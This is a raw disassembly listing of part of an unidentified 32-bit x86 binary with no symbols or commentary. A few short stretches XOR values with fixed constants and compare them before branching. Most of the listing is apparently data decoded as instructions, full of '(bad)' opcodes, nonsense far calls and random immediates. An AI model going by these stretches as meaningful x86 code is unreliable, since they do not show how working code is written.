  407d75:	les    edx,FWORD PTR [ebp-0x12]
  407d78:	imul   ebx,DWORD PTR [ecx],0xb7b079ba
  407d7e:	push   0x2e39880d
  407d83:	mov    cl,0xd8
  407d85:	(bad)  
  407d86:	std    
  407d87:	push   es
  407d88:	xor    bh,BYTE PTR [ebp+0x3e]
  407d8b:	outs   dx,BYTE PTR ds:[esi]
  407d8c:	popf   
  407d8d:	jo     0x407d2b
  407d8f:	jle    0x407d7e
  407d91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d92:	nop
  407d93:	mov    ds:0x4fe6dc52,eax
  407d98:	imul   edi,DWORD PTR ss:[ebx],0x4ec3577f
  407d9f:	sub    ah,dl
  407da1:	or     BYTE PTR [edi],ah
  407da3:	setb   BYTE PTR [esi-0x7cefed3d]
  407daa:	pop    ebp
  407dab:	xchg   esp,eax
  407dac:	loope  0x407e06
  407dae:	gs mov esp,ecx
  407db1:	inc    ebp
  407db2:	dec    ebx
  407db3:	inc    edx
  407db4:	pop    esi
  407db5:	xor    DWORD PTR [eax],esi
  407db7:	xor    ah,BYTE PTR [ebp-0x5e]
  407dba:	(bad)  
  407dbb:	mov    esi,0xfa51005e
  407dc0:	mov    eax,ecx
  407dc2:	mov    ecx,DWORD PTR [ebp-0x34]
  407dc5:	shrd   ecx,eax,0x2
  407dc9:	shl    edx,0x1e
  407dcc:	xor    edx,0x40000000
  407dd2:	or     edx,DWORD PTR [ebp-0x64]
  407dd5:	mov    DWORD PTR [ebp-0x30],ecx
  407dd8:	mov    ecx,DWORD PTR [esi]
  407dda:	mov    DWORD PTR [ebp-0x5c],ecx
  407ddd:	shl    DWORD PTR [ebp-0x5c],0x1e
  407de1:	xor    DWORD PTR [ebp-0x5c],0x40000000
  407de8:	mov    DWORD PTR [ebp-0x6c],edx
  407deb:	mov    edx,DWORD PTR [esi+0x4]
  407dee:	mov    edx,DWORD PTR [ebp-0x5c]
  407df1:	xor    ecx,ecx
  407df3:	or     ecx,DWORD PTR [ebp-0x30]
  407df6:	shr    eax,0x2
  407df9:	or     edx,eax
  407dfb:	cmp    ecx,DWORD PTR [ebp-0x70]
  407dfe:	jne    0x4071b0
  407e04:	cmp    edx,DWORD PTR [ebp-0x6c]
  407e07:	je     0x40a9b0
  407e0d:	jmp    0x4071b0
  407e12:	mov    ecx,DWORD PTR [ebx]
  407e14:	mov    eax,DWORD PTR [ebx+0x4]
  407e17:	xor    eax,0x9c1b89e8
  407e1c:	xor    ecx,0xca79a577
  407e22:	shrd   ecx,eax,0x2
  407e26:	shr    eax,0x2
  407e29:	mov    DWORD PTR [ebp-0x6c],eax
  407e2c:	mov    eax,DWORD PTR [ebx]
  407e2e:	mov    edx,DWORD PTR [ebx+0x4]
  407e31:	mov    edx,eax
  407e33:	xor    eax,eax
  407e35:	or     eax,ecx
  407e37:	shl    edx,0x1e
  407e3a:	xor    edx,0x40000000
  407e40:	or     edx,DWORD PTR [ebp-0x6c]
  407e43:	mov    DWORD PTR [ebp-0x68],eax
  407e46:	mov    eax,DWORD PTR [esi]
  407e48:	xor    eax,0xca79a577
  407e4d:	mov    DWORD PTR [ebp+0x14],eax
  407e50:	mov    DWORD PTR [ebp-0x64],edx
  407e53:	mov    edx,DWORD PTR [esi+0x4]
  407e56:	mov    ecx,0x9c1b89e8
  407e5b:	xor    edx,ecx
  407e5d:	mov    eax,edx
  407e5f:	mov    edx,DWORD PTR [ebp+0x14]
  407e62:	shrd   edx,eax,0x2
  407e66:	shr    eax,0x2
  407e69:	jmp    0x408247
  407e6e:	push   ss
  407e6f:	dec    esi
  407e70:	dec    ecx
  407e71:	test   BYTE PTR [eax-0x22],0x27
  407e75:	cs aam 0xd8
  407e78:	sbb    eax,0x4782987e
  407e7d:	push   0x22
  407e7f:	outs   dx,DWORD PTR ds:[esi]
  407e80:	sbb    BYTE PTR [eax],bl
  407e82:	sahf   
  407e83:	adc    bl,BYTE PTR [eax]
  407e85:	sbb    BYTE PTR [esi-0x56d9294a],bh
  407e8b:	cld    
  407e8c:	nop
  407e8d:	pop    eax
  407e8e:	mov    al,dl
  407e90:	jno    0x407e1d
  407e92:	inc    ecx
  407e93:	jb     0x407ea3
  407e95:	add    DWORD PTR [eax+eax*2],esp
  407e98:	inc    esp
  407e99:	mov    al,0x50
  407e9b:	and    dl,BYTE PTR [edx]
  407e9d:	xchg   ebx,eax
  407e9e:	call   0x56e7:0x63173a57
  407ea5:	fs pop ecx
  407ea7:	or     eax,0x241793d9
  407eac:	jbe    0x407ed8
  407eae:	jno    0x407e65
  407eb0:	outs   dx,BYTE PTR ds:[esi]
  407eb1:	inc    ecx
  407eb2:	jg     0x407f2d
  407eb4:	xchg   DWORD PTR gs:[ecx+0x1],edx
  407eb8:	and    ebx,DWORD PTR [eax+0x7f]
  407ebb:	xchg   ecx,eax
  407ebc:	adc    ecx,DWORD PTR [ebp-0x6e84156f]
  407ec2:	out    0x4d,eax
  407ec4:	dec    ecx
  407ec5:	pop    esi
  407ec6:	sub    dh,bh
  407ec8:	xor    al,0x32
  407eca:	or     ah,BYTE PTR [esp+eiz*4-0x31]
  407ece:	rol    cl,1
  407ed0:	push   edx
  407ed1:	push   esi
  407ed2:	add    DWORD PTR [ebx],0x3f
  407ed5:	nop
  407ed6:	mov    ?,WORD PTR [ecx]
  407ed8:	pop    eax
  407ed9:	dec    ebx
  407eda:	push   0x425e2e15
  407edf:	xor    dh,bh
  407ee1:	inc    edi
  407ee2:	imul   ecx,DWORD PTR [edi-0x3],0xffffffaa
  407ee6:	xor    BYTE PTR [edx-0x4d6a2eeb],0x30
  407eed:	call   0xf7d5:0x5aff0a40
  407ef4:	js     0x407e9c
  407ef6:	out    0x62,eax
  407ef8:	fwait
  407ef9:	(bad)  
  407efa:	ficomp DWORD PTR [ebx-0x3]
  407efd:	jg     0x407f77
  407eff:	imul   ebp,DWORD PTR [edi],0x2e
  407f02:	xchg   ebx,eax
  407f03:	scas   al,BYTE PTR es:[edi]
  407f04:	mov    ecx,0x1ef4e5a8
  407f09:	call   0xbdf5f8ed
  407f0e:	lods   al,BYTE PTR ds:[esi]
  407f0f:	add    BYTE PTR [eax+0x47],al
  407f12:	(bad)  
  407f13:	(bad)  
  407f14:	mov    dl,0x39
  407f16:	test   eax,0x98932651
  407f1b:	cmc    
  407f1c:	cmp    BYTE PTR [eax+eax*4],0x7
  407f20:	test   ecx,esp
  407f22:	inc    esi
  407f23:	mov    cl,al
  407f25:	not    BYTE PTR [edi]
  407f27:	stc    
  407f28:	inc    ebp
  407f29:	gs addr16 mov edi,0x7be1165a
  407f30:	jle    0x407f0a
  407f32:	and    DWORD PTR [di+0x3e07],ecx
  407f37:	mov    al,0xa6
  407f39:	bound  eax,QWORD PTR [esp+edi*1-0x7f]
  407f3d:	xchg   bl,ch
  407f3f:	outs   dx,BYTE PTR ds:[esi]
  407f40:	push   ds
  407f41:	add    al,0x5b
  407f43:	daa    
  407f44:	and    BYTE PTR [eax+0x77],0x4d
  407f48:	xor    edx,DWORD PTR [edx-0x1e]
  407f4b:	mov    dh,0xad
  407f4d:	xchg   esi,eax
  407f4e:	(bad)  
  407f4f:	cmp    BYTE PTR [eax-0x9072cf4],dl
  407f55:	std    
  407f56:	push   ds
  407f57:	mov    dl,0x51
  407f59:	popf   
  407f5a:	loop   0x407f05
  407f5c:	xor    DWORD PTR [edx+0x1203956],edi
  407f62:	adc    ecx,eax
  407f64:	imul   ebx,DWORD PTR [ebp+0x5baa78dd],0x15
  407f6b:	scas   al,BYTE PTR es:[edi]
  407f6c:	bound  ecx,QWORD PTR [ecx+0x39]
  407f6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f70:	jb     0x407f4b
  407f72:	rcr    DWORD PTR [esp+esi*2-0x1c76c3e2],0x41
  407f7a:	scas   eax,DWORD PTR es:[edi]
  407f7b:	lds    ecx,FWORD PTR [esi]
  407f7d:	fistp  QWORD PTR [edi]
  407f7f:	std    
  407f80:	xchg   edx,eax
  407f81:	jno    0x407f69
  407f83:	adc    ch,ah
  407f85:	push   ds
  407f86:	sub    BYTE PTR [edi+0x424f825a],bl
  407f8c:	xchg   DWORD PTR [ebp+0x59],ecx
  407f8f:	mov    ebp,0xf1d83cd9
  407f94:	dec    ebx
  407f95:	or     al,0x53
  407f97:	jne    0x407fc6
  407f99:	push   ss
  407f9a:	sbb    DWORD PTR [edx+0x7d],eax
  407f9d:	add    al,0x85
  407f9f:	js     0x407f68
  407fa1:	es sti 
  407fa3:	les    edx,FWORD PTR [edx+0x65]
  407fa6:	push   es
  407fa7:	aas    
  407fa8:	xchg   ebx,eax
  407fa9:	adc    BYTE PTR [ebx],al
  407fab:	mov    ds:0xc87e09e6,eax
  407fb0:	lds    ebp,FWORD PTR [edx]
  407fb2:	dec    esi
  407fb3:	and    edx,ecx
  407fb5:	sub    ch,BYTE PTR [edx+eiz*1]
  407fb8:	dec    eax
  407fb9:	mov    bl,0xa2
  407fbb:	pop    ecx
  407fbc:	in     eax,0xfe
  407fbe:	and    BYTE PTR [esi-0x65d35418],bl
  407fc4:	in     eax,0xe7
  407fc6:	out    dx,al
  407fc7:	and    DWORD PTR [edi],ebx
  407fc9:	inc    edi
  407fca:	call   0x6fde:0x85a17a48
  407fd1:	ret    
  407fd2:	jle    0x40800a
  407fd4:	dec    edx
  407fd5:	sbb    BYTE PTR gs:[edi],bl
  407fd8:	pop    ebx
  407fd9:	inc    edi
  407fda:	jmp    0x4c3:0x98827855
  407fe1:	jb     0x407fed
  407fe3:	pop    esp
  407fe4:	mov    esi,0x8d75248b
  407fe9:	add    edx,DWORD PTR [edx-0x30]
  407fec:	aaa    
  407fed:	fcomip st,st(6)
  407fef:	jnp    0x407fc4
  407ff1:	stos   DWORD PTR es:[edi],eax
  407ff2:	xor    BYTE PTR [edx],ah
  407ff4:	sub    dh,bh
  407ff6:	xchg   ebx,eax
  407ff7:	popa   
  407ff8:	adc    eax,0x5636b4fc
  407ffd:	mov    al,ds:0xb8c4081f
  408002:	add    DWORD PTR [edx+ecx*8-0xd],esp
  408006:	gs and eax,0x64ec7a31
  40800c:	push   cs
  40800d:	mov    ebp,ebx
  40800f:	sbb    ebp,eax
  408011:	cmp    BYTE PTR [edx+0x4fc9a7ae],0x2
  408018:	adc    DWORD PTR [esi+0x4f],edx
  40801b:	jle    0x407fa7
  40801d:	mov    cl,0x70
  40801f:	scas   al,BYTE PTR es:[edi]
  408020:	push   es
  408021:	push   esp
  408022:	out    dx,al
  408023:	cmp    edx,DWORD PTR [eax+ebp*4]
  408026:	dec    ebp
  408027:	mov    WORD PTR [ebp+0x72],cs
  40802a:	xor    eax,0x5e571055
  40802f:	and    eax,0x6c2998ca
  408034:	push   esp
  408035:	cmp    DWORD PTR [esi+0x150eecc2],esi
  40803b:	(bad)  
  40803c:	jne    0x408099
  40803e:	fisttp DWORD PTR [eax-0x68f9e5e7]
  408044:	leave  
  408045:	cs inc esp
  408047:	jb     0x407ff3
  408049:	xor    al,0x76
  40804b:	pop    edx
  40804c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40804d:	loope  0x408075
  40804f:	pop    eax
  408050:	or     BYTE PTR [ecx],al
  408052:	std    
  408053:	pop    eax
  408054:	pushf  
  408055:	pusha  
  408056:	dec    edi
  408057:	es (bad) 
  40805a:	sub    al,0x2d
  40805c:	mov    ah,0x1c
  40805e:	outs   dx,DWORD PTR ds:[esi]
  40805f:	in     al,0x3
  408061:	ins    BYTE PTR es:[edi],dx
  408062:	push   ebp
  408063:	and    DWORD PTR [edx],esi
  408065:	pop    eax
  408066:	into   
  408067:	add    al,0x35
  408069:	and    edi,DWORD PTR [eax-0x4a293866]
  40806f:	and    eax,0x6b3a591
  408074:	test   ecx,esp
  408076:	sti    
  408077:	cld    
  408078:	inc    ebp
  408079:	inc    ebp
  40807a:	pop    ebp
  40807b:	das    
  40807c:	ret    
  40807d:	dec    edx
  40807e:	pinsrw mm5,WORD PTR [ebp+0x51],0x6
  408083:	sbb    dl,BYTE PTR [ebp+0x7f050b32]
  408089:	jecxz  0x4080cc
  40808b:	lock pop esp
  40808d:	add    dh,BYTE PTR [eax-0x16]
  408090:	pop    esp
  408091:	jge    0x40806e
  408093:	pop    ecx
  408094:	sbb    al,0xc3
  408096:	ins    DWORD PTR es:[edi],dx
  408097:	fisub  DWORD PTR [edi+0xf]
  40809a:	jmp    0xce4e823f
  40809f:	push   ecx
  4080a0:	jo     0x408028
  4080a2:	out    dx,eax
  4080a3:	pop    edi
  4080a4:	jp     0x408034
  4080a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080a7:	clc    
  4080a8:	and    BYTE PTR [edi-0x1b],0x0
  4080ac:	adc    bl,0xfb
  4080af:	dec    DWORD PTR ds:0x9021deee
  4080b5:	pop    eax
  4080b6:	and    eax,0xd4bdd2d1
  4080bb:	mov    cl,0xa5
  4080bd:	pop    es
  4080be:	sbb    eax,0xad94c37b
  4080c3:	mov    ecx,0x7e13093
  4080c8:	dec    ebp
  4080c9:	lds    esp,FWORD PTR [edx]
  4080cb:	xor    eax,0xe7fa6458
  4080d0:	and    BYTE PTR [ecx+0x9c47ce8],dl
  4080d6:	aas    
  4080d7:	mov    ds:0x743fa619,al
  4080dc:	mov    cl,0xda
  4080de:	sub    DWORD PTR [bx+di-0x62e1],0xffffffe3
  4080e4:	push   0x112775bb
  4080e9:	mov    ebx,0x7f778912
  4080ee:	sub    ebx,edi
  4080f0:	mov    ecx,0xba842e17
  4080f5:	xchg   ebx,eax
  4080f6:	fsub   QWORD PTR [ebx*2-0x3216f880]
  4080fd:	mov    cl,0xac
  4080ff:	in     al,0x16
  408101:	aam    0xf2
  408103:	int3   
  408104:	mov    eax,0x9b87cdb
  408109:	cmp    al,0xe1
  40810b:	xchg   DWORD PTR [edi+0x66],esp
  40810e:	push   0xffffff93
  408110:	retf   
  408111:	repnz sbb eax,0x9fcfc8de
  408117:	jae    0x408154
  408119:	xchg   DWORD PTR ds:0x3efe05ae,edi
  40811f:	je     0x408124
  408121:	dec    esp
  408122:	xor    esp,DWORD PTR [esi-0xee2df6d]
  408128:	neg    BYTE PTR [ebp+eiz*1-0x624d915b]
  40812f:	call   0x3692a6dc
  408134:	xlat   BYTE PTR ds:[ebx]
  408135:	inc    ebp
  408136:	stos   BYTE PTR es:[edi],al
  408137:	xor    eax,0x825a0c1
  40813c:	repz inc ecx
  40813e:	mov    ch,0xc7
  408140:	push   edx
  408141:	(bad)
  408145:	xchg   esp,ecx
  408147:	imul   ebx,eax,0x45
  40814a:	sahf   
  40814b:	sub    al,0xc
  40814d:	rcl    DWORD PTR [eax],cl
  40814f:	and    eax,0x37570a36
  408154:	stos   BYTE PTR es:[edi],al
  408155:	retf   
  408156:	inc    ecx
  408157:	ss jge 0x40815e
  40815a:	push   ecx
  40815b:	add    edi,DWORD PTR [ecx]
  40815d:	mov    ebp,0x9aad4d6b
  408162:	sti    
  408163:	jbe    0x4081d3
  408165:	add    ch,BYTE PTR [esi+0x2a]
  408168:	call   0x1e4cb65b
  40816d:	jns    0x40812c
  40816f:	mov    edi,0x82cb4e21
  408174:	add    esp,DWORD PTR [edi]
  408176:	dec    ebp
  408177:	jg     0x40818e
  408179:	mov    DWORD PTR [ecx+0x28],eax
  40817c:	inc    esi
  40817d:	cmp    DWORD PTR [ebp-0x2b4434a4],0x80cff05b
  408187:	(bad)  
  408188:	fsubr  DWORD PTR [edi-0x64226299]
  40818e:	imul   edx,DWORD PTR [esi],0x67
  408191:	lods   eax,DWORD PTR ds:[esi]
  408192:	mov    ebx,0x654f8a22
  408197:	mov    al,ds:0x4dd65b51
  40819c:	mov    eax,ecx
  40819e:	pusha  
  40819f:	and    al,0xd9
  4081a1:	inc    esp
  4081a2:	jmp    0x408158
  4081a4:	in     eax,0x98
  4081a6:	sub    BYTE PTR [ecx+0x6e1fa42d],ah
  4081ac:	or     eax,0xfbad9d47
  4081b1:	push   eax
  4081b2:	js     0x40814f
  4081b4:	and    DWORD PTR [ecx-0x48],0xf64e9cac
  4081bb:	push   ds
  4081bc:	das    
  4081bd:	mov    edi,edx
  4081bf:	popf   
  4081c0:	pop    ecx
  4081c1:	scas   eax,DWORD PTR es:[edi]
  4081c2:	push   0xe6b3475c
  4081c7:	sub    BYTE PTR [esi+ebp*1-0x2e],ch
  4081cb:	mov    fs,WORD PTR [esi-0x45]
  4081ce:	jbe    0x408205
  4081d0:	mov    bl,0xb1
  4081d2:	mov    al,0xed
  4081d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081d5:	pop    ebx
  4081d6:	or     dl,bh
  4081d8:	cs xchg ecx,eax
  4081da:	adc    eax,0x72d3f024
  4081df:	(bad)  
  4081e0:	mov    ds:0xb2226a66,eax
  4081e5:	dec    edx
  4081e6:	pop    ds
  4081e7:	int3   
  4081e8:	out    0x2,eax
  4081ea:	xchg   edx,eax
  4081eb:	das    
  4081ec:	jnp    0x4081f8
  4081ee:	gs dec esi
  4081f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081f1:	dec    ecx
  4081f2:	jmp    0x408260
  4081f4:	add    ch,BYTE PTR [edi-0x65]
  4081f7:	or     DWORD PTR [edi-0x63],ebx
  4081fa:	icebp  
  4081fb:	jb     0x4081d7
  4081fd:	call   0xaa0f:0x603ed661
  408204:	sub    eax,0x8a425b6f
  408209:	int3   
  40820a:	enter  0x5c64,0x81
  40820e:	sub    BYTE PTR [ebx+0x19d46814],cl
  408214:	cmp    BYTE PTR [edx-0x6d],0xf1
  408218:	shl    BYTE PTR [esi-0x2db5fb41],0x1c
  40821f:	scas   al,BYTE PTR es:[edi]
  408220:	test   DWORD PTR [ebp+0x6a],edi
  408223:	push   ss
  408224:	mov    ch,0x2e
  408226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408227:	(bad)  
  408228:	xchg   edi,eax
  408229:	jl     0x408222
  40822b:	sbb    ebx,DWORD PTR [ebx-0x28]
  40822e:	and    BYTE PTR [eax-0x6222fdc5],dh
  408234:	adc    eax,0x7f28a25a
  408239:	mov    ebp,0xc0bbaf7f
  40823e:	call   0x62eec89c
  408243:	dec    ebx
  408244:	mov    DWORD PTR [edx+0x25],ebx
  408247:	mov    DWORD PTR [ebp-0x6c],eax
  40824a:	mov    eax,DWORD PTR [esi]
  40824c:	mov    DWORD PTR [ebp+0x14],eax
  40824f:	shl    DWORD PTR [ebp+0x14],0x1e
  408253:	xor    DWORD PTR [ebp+0x14],0x40000000
  40825a:	xor    eax,eax
  40825c:	mov    DWORD PTR [ebp-0x70],edx
  40825f:	or     eax,DWORD PTR [ebp-0x70]
  408262:	mov    edx,DWORD PTR [esi+0x4]
  408265:	mov    DWORD PTR [ebp-0x60],eax
  408268:	mov    eax,DWORD PTR [ebp+0x14]
  40826b:	or     eax,DWORD PTR [ebp-0x6c]
  40826e:	mov    DWORD PTR [ebp-0x5c],eax
  408271:	mov    eax,DWORD PTR [ebp-0x68]
  408274:	cmp    DWORD PTR [ebp-0x60],eax
  408277:	jmp    0x408655
  40827c:	xchg   edx,eax
  40827d:	hlt    
  40827e:	xchg   ebp,eax
  40827f:	addr16 jb 0x4082e9
  408282:	(bad)  
  408283:	in     al,0x70
  408285:	mov    edx,0xecdd709d
  40828a:	fistp  QWORD PTR [esi-0x58]
  40828d:	sbb    BYTE PTR [bx+si],bl
  408290:	sahf   
  408291:	adc    bl,BYTE PTR [eax]
  408293:	sbb    BYTE PTR [esi-0x74],ch
  408296:	xor    eax,0xf39eb6f9
  40829b:	shl    BYTE PTR [esi],1
  40829d:	adc    al,0xa6
  40829f:	sub    eax,0xffffffa0
  4082a2:	sub    BYTE PTR [ebp-0x58],dh
  4082a5:	call   edi
  4082a7:	in     al,0xd1
  4082a9:	sbb    eax,0x5ca26f5e
  4082ae:	dec    esi
  4082af:	mov    esi,ebp
  4082b1:	cmc    
  4082b2:	jp     0x40826c
  4082b4:	xlat   BYTE PTR ds:[ebx]
  4082b5:	dec    ebp
  4082b6:	stos   DWORD PTR es:[edi],eax
  4082b7:	es ins BYTE PTR es:[edi],dx
  4082b9:	cli    
  4082ba:	and    eax,0x1a205340
  4082bf:	and    eax,0xd6d52dd9
  4082c4:	call   0x52bd:0xf1bf7a86
  4082cb:	xchg   ecx,eax
  4082cc:	xchg   BYTE PTR [esi-0x5c],bh
  4082cf:	sub    bl,ch
  4082d1:	inc    esi
  4082d2:	or     eax,0x996670b4
  4082d7:	icebp  
  4082d8:	xor    al,0x4f
  4082da:	sar    dl,cl
  4082dc:	ja     0x4082ae
  4082de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082df:	out    dx,al
  4082e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082e1:	loope  0x408359
  4082e3:	dec    ecx
  4082e4:	sbb    DWORD PTR [ebp+0x4de61ce4],ecx
  4082ea:	ret    0xfd0a
  4082ed:	addr16 imul esi,edx,0x1f8e44be
  4082f4:	mov    ebx,DWORD PTR [ecx-0x67]
  4082f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082f8:	jge    0x408286
  4082fa:	test   DWORD PTR [edi-0x3e],esp
  4082fd:	xchg   ebx,eax
  4082fe:	inc    ebp
  4082ff:	cdq    
  408300:	dec    ecx
  408301:	mov    eax,ds:0xba784901
  408306:	call   FWORD PTR [edx+0x26]
  408309:	dec    eax
  40830a:	dec    ebx
  40830b:	xchg   ecx,eax
  40830c:	ds xor al,0x9a
  40830f:	jnp    0x408384
  408311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408312:	stos   BYTE PTR es:[edi],al
  408313:	aaa    
  408314:	cmp    eax,0xe7dc8ded
  408319:	push   cs
  40831a:	(bad)  
  40831b:	pop    ecx
  40831c:	icebp  
  40831d:	push   ss
  40831e:	arpl   WORD PTR [esi-0x6750602f],ax
  408324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408325:	(bad)  
  408326:	mov    ah,0xe6
  408328:	lahf   
  408329:	stos   BYTE PTR es:[edi],al
  40832a:	fsub   st(7),st
  40832c:	shr    ch,1
  40832e:	sub    DWORD PTR [edi-0x6b],edx
  408331:	xchg   ebx,eax
  408332:	jne    0x40838d
  408334:	outs   dx,BYTE PTR ds:[esi]
  408335:	retf   0x3c84
  408338:	fldenv [eax]
  40833a:	push   edx
  40833b:	ins    BYTE PTR es:[edi],dx
  40833c:	cli    
  40833d:	cli    
  40833e:	jns    0x408332
  408340:	mov    bl,0x32
  408342:	lods   eax,DWORD PTR ds:[esi]
  408343:	daa    
  408344:	scas   eax,DWORD PTR es:[edi]
  408345:	outs   dx,BYTE PTR ds:[esi]
  408346:	xchg   ebp,eax
  408347:	out    dx,eax
  408348:	and    DWORD PTR [eax],edx
  40834a:	lods   eax,DWORD PTR ds:[esi]
  40834b:	sub    DWORD PTR [ecx+ebp*8-0x11094920],eax
  408352:	cmovns edi,DWORD PTR [esp+eiz*2-0x117f3c13]
  40835a:	sbb    BYTE PTR [ebx+0x7b],dh
  40835d:	data16 or al,0x5b
  408360:	sub    dh,BYTE PTR [esi+0x16]
  408363:	push   edi
  408364:	test   eax,0xd6cef422
  408369:	pop    esp
  40836a:	dec    edx
  40836b:	sbb    DWORD PTR [esi+0x3fad183b],ebx
  408371:	pop    ecx
  408372:	inc    esi
  408373:	in     al,0x5d
  408375:	in     eax,dx
  408376:	(bad)  
  408377:	fsubr  st(1),st
  408379:	xchg   ebp,eax
  40837a:	add    eax,0x10f68a3b
  40837f:	dec    ebp
  408380:	mov    bl,0x7
  408382:	jno    0x408304
  408384:	rcr    DWORD PTR [ebp-0x1f],cl
  408387:	jbe    0x408324
  408389:	or     BYTE PTR [esp+edx*2],bl
  40838c:	xor    BYTE PTR [ebx+0x3d],0xd4
  408390:	xchg   edx,eax
  408391:	sub    DWORD PTR [ecx+0x24],ebx
  408394:	fnstenv [esi+0x53]
  408397:	into   
  408398:	add    eax,0x1e5af657
  40839d:	jne    0x40838c
  40839f:	outs   dx,DWORD PTR ds:[si]
  4083a1:	lods   al,BYTE PTR ds:[esi]
  4083a2:	iret   
  4083a3:	(bad)  
  4083a4:	xchg   ecx,eax
  4083a5:	add    BYTE PTR [edi-0x13],bh
  4083a8:	and    al,0xa4
  4083aa:	push   edx
  4083ab:	leave  
  4083ac:	div    DWORD PTR [ebp-0x64a71de3]
  4083b2:	xchg   esp,eax
  4083b3:	push   0x57c2c11a
  4083b8:	inc    edx
  4083b9:	add    cl,BYTE PTR [ebx]
  4083bb:	dec    edi
  4083bc:	mov    ebx,DWORD PTR [esi-0x7dd995c9]
  4083c2:	sub    al,0x93
  4083c4:	jae    0x4083f6
  4083c6:	lock jne 0x408423
  4083c9:	mov    ch,0x98
  4083cb:	xchg   ebx,eax
  4083cc:	cmp    BYTE PTR [ecx+0x14],ch
  4083cf:	sub    al,0xc4
  4083d1:	sbb    eax,DWORD PTR [eax+0x1d]
  4083d4:	adc    edi,DWORD PTR [ebx-0x7b37b81e]
  4083da:	adc    DWORD PTR [edi-0x3b559bf4],eax
  4083e0:	mov    ebx,0xfc183bc2
  4083e5:	add    bh,dl
  4083e7:	stc    
  4083e8:	stos   BYTE PTR es:[edi],al
  4083e9:	mov    ebp,0x534a0ea0
  4083ee:	je     0x4083e4
  4083f0:	ds xchg ebx,eax
  4083f2:	shr    esp,cl
  4083f4:	inc    ebp
  4083f5:	cwde   
  4083f6:	fisub  WORD PTR [ebp+0x2f]
  4083f9:	mov    dh,0x81
  4083fb:	adc    eax,0xc8bbe758
  408400:	push   ebx
  408401:	sbb    ah,dh
  408403:	daa    
  408404:	push   cs
  408405:	(bad)  
  408406:	jl     0x4083f9
  408408:	mov    fs,WORD PTR [edx+0x6a]
  40840b:	inc    esi
  40840c:	inc    ebp
  40840d:	test   al,0xf4
  40840f:	xchg   ecx,eax
  408410:	ficom  WORD PTR [ebx-0x76]
  408413:	cmp    eax,0x8935b1ca
  408418:	mov    WORD PTR [ebp+0x71442508],fs
  40841e:	sbb    ebx,ebp
  408420:	add    dl,bh
  408422:	fnstenv [edx+0xd]
  408425:	loopne 0x4083f0
  408427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408428:	icebp  
  408429:	dec    edx
  40842a:	and    BYTE PTR [ecx+ebp*1+0x32],al
  40842e:	push   edx
  40842f:	sbb    bh,BYTE PTR [esi]
  408431:	cmc    
  408432:	out    0xa4,eax
  408434:	push   ecx
  408435:	das    
  408436:	cmp    edx,DWORD PTR [ebx]
  408438:	mov    edx,0x6dfad5c2
  40843d:	adc    eax,0x178525b7
  408442:	iret   
  408443:	pop    ebp
  408444:	imul   esp,DWORD PTR [ebx],0x72
  408447:	dec    edx
  408448:	push   0x54df1e7c
  40844d:	xchg   ecx,eax
  40844e:	mov    cl,0xa
  408450:	(bad)  
  408451:	jbe    0x408447
  408453:	stos   DWORD PTR es:[edi],eax
  408454:	or     bl,BYTE PTR [esi+0x45ae516]
  40845a:	add    edx,edi
  40845c:	inc    esp
  40845d:	sbb    BYTE PTR [esi+0x7044fe1a],bl
  408463:	mov    ds:0xdab737f4,al
  408468:	cmp    al,BYTE PTR [ecx]
  40846a:	sahf   
  40846b:	jle    0x4084b3
  40846d:	mov    ch,0x65
  40846f:	or     al,0x40
  408471:	pop    edx
  408472:	or     al,0x1f
  408474:	pop    ecx
  408475:	adc    eax,0x1f4284d4
  40847a:	fisttp WORD PTR [eax]
  40847c:	jbe    0x408448
  40847e:	mov    ebx,0x4dfdd085
  408483:	push   edi
  408484:	fidiv  WORD PTR [ecx-0x51]
  408487:	stos   DWORD PTR es:[edi],eax
  408488:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408489:	mov    esi,0x5746c992
  40848e:	(bad)  
  40848f:	xlat   BYTE PTR ds:[ebx]
  408490:	pop    edi
  408491:	and    bl,BYTE PTR [ecx+ebx*1-0xf85f0d8]
  408498:	pushf  
  408499:	pop    ebp
  40849a:	and    dh,BYTE PTR ds:0x5d149add
  4084a0:	and    BYTE PTR [edi+0x5cea951f],bh
  4084a6:	pop    eax
  4084a7:	dec    ecx
  4084a8:	mov    al,0xb4
  4084aa:	bound  esp,QWORD PTR [eax+eax*4]
  4084ad:	and    ecx,edx
  4084af:	dec    ebp
  4084b0:	mov    eax,0x829fbfd6
  4084b5:	sahf   
  4084b6:	stc    
  4084b7:	sbb    edi,DWORD PTR ss:[eax]
  4084ba:	pushf  
  4084bb:	stos   DWORD PTR es:[edi],eax
  4084bc:	and    cl,BYTE PTR [ecx]
  4084be:	xchg   bl,al
  4084c0:	mov    WORD PTR ds:0x3cb0b629,gs
  4084c6:	push   esp
  4084c7:	sbb    ch,BYTE PTR [eax-0x45]
  4084ca:	cmp    al,al
  4084cc:	popa   
  4084cd:	loope  0x408539
  4084cf:	lods   eax,DWORD PTR ds:[esi]
  4084d0:	lods   eax,DWORD PTR ds:[esi]
  4084d1:	std    
  4084d2:	mov    dh,0x91
  4084d4:	fild   WORD PTR ds:0x63b49347
  4084da:	xor    esp,DWORD PTR [ebx+0x4c50ba21]
  4084e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084e1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4084e3:	lods   al,BYTE PTR ds:[esi]
  4084e4:	pop    esp
  4084e5:	call   0xc0efed26
  4084ea:	pop    esi
  4084eb:	xchg   ecx,eax
  4084ec:	ins    DWORD PTR es:[edi],dx
  4084ed:	lods   al,BYTE PTR ds:[esi]
  4084ee:	xlat   BYTE PTR ds:[ebx]
  4084ef:	add    ch,BYTE PTR [edx]
  4084f1:	push   ds
